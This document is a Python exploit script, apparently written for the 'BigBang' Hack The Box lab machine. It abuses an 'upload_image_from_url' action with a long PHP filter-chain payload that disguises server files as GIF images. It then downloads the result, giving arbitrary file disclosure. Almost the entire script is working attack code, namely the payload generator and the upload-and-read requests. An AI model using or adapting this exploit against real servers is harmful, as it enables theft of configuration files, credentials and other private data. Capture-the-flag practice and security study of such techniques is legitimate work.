#!/usr/bin/env python3

import os
import random
import argparse
import requests

parser = argparse.ArgumentParser(
        prog=os.path.basename(__file__),
        description="File disclosure tool for the bigbang HTB box."
        )
parser.add_argument("-u", "--url", help="Target URL", required=True)
parser.add_argument("-f", "--file", help="File to read", required=True)

args = parser.parse_args()

url = args.url
file = args.file
file_id = random.randint(1, 10000)

session = requests.Session()


def gen_payload(file):
    # https://github.com/ambionics/wrapwrap
    # python3 wrapwrap.py -p X <file> 'GIF89a' '' 9999
    payload = "php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=" + file

    return payload


def upload(url, file, file_id):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "action": "upload_image_from_url",
        "url": gen_payload(file),
        "id": file_id,
        "accepted_files": "image/gif"
    }

    r = session.post(url, data=data, headers=headers)

    if r.status_code == 200 and "attachment_id" in r.text:
        uploaded_file = r.json()["response"]
        print("[+] File uploaded successfully. It can be found here:", uploaded_file)
    elif r.status_code == 200 and "FAILED" in r.text:
        print("[!] File type is not allowed or you can't read this file.")
        exit(-1)

    return uploaded_file


def read_file(url):
    r = session.get(url)
    if r.status_code == 200:
        file_contents = r.text
        print("[+] Printing the contents of the file:\n")
    else:
        print("[!] Couldn't retrieve the contents of the file.")
        exit(-1)

    print(file_contents.replace("GIF89a", "") + "\n")


def main():
    file_path = upload(url, file, file_id)
    read_file(file_path)


if __name__ == "__main__":
    main()
